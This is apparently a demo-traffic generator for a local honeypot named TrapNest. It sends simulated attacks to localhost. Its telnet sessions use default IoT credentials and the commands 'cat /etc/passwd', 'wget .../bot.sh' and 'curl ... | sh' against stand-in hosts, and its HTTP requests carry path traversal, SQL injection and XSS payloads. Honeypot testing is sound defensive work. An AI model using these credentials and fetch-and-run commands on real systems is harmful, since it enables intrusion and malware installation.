#!/usr/bin/env python3
"""Generates harmless test traffic against YOUR OWN local honeypot so you can demo the report."""
import argparse
import socket
import time
import urllib.parse
import urllib.request


def parse_args():
    parser = argparse.ArgumentParser(description="Generate demo traffic for TrapNest")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--telnet-port", type=int, default=2323)
    parser.add_argument("--http-port", type=int, default=8080)
    return parser.parse_args()


def telnet(host, telnet_port, creds, cmds):
    s = socket.create_connection((host, telnet_port), timeout=5)
    f = s.makefile("rw")
    for u, p in creds:
        s.recv(100)
        s.sendall(f"{u}\n".encode())
        s.recv(100)
        s.sendall(f"{p}\n".encode())
    time.sleep(0.3)
    s.recv(200)
    for c in cmds:
        s.sendall(f"{c}\n".encode())
        time.sleep(0.1)
        s.recv(300)
    s.sendall(b"exit\n")
    s.close()


def http(host, http_port, path, data=None):
    req = urllib.request.Request(
        f"http://{host}:{http_port}{path}",
        data=data and urllib.parse.urlencode(data).encode(),
        headers={"User-Agent": "sqlmap/1.7" if data else "Nmap Scripting Engine"},
    )
    try:
        urllib.request.urlopen(req, timeout=5).read()
    except Exception:
        pass


def main():
    args = parse_args()
    telnet(args.host, args.telnet_port, [("root", "xc3511"), ("admin", "admin"), ("root", "vizxv")], ["whoami", "uname -a", "cat /etc/passwd", "wget http://203.0.113.9/bot.sh -O /tmp/b", "ls"])
    telnet(args.host, args.telnet_port, [("user", "1234"), ("root", "root"), ("guest", "guest")], ["id", "curl http://198.51.100.7/x.sh | sh"])
    for p in ["/", "/admin", "/../../etc/passwd", "/index.php?id=1'%20OR%20'1'='1"]:
        http(args.host, args.http_port, p)
    http(args.host, args.http_port, "/login", {"username": "admin", "password": "' OR 1=1-- "})
    http(args.host, args.http_port, "/login", {"username": "<script>alert(1)</script>", "password": "admin123"})
    print("[+] Simulated attacks sent. Run: python main.py analyze")


if __name__ == "__main__":
    main()
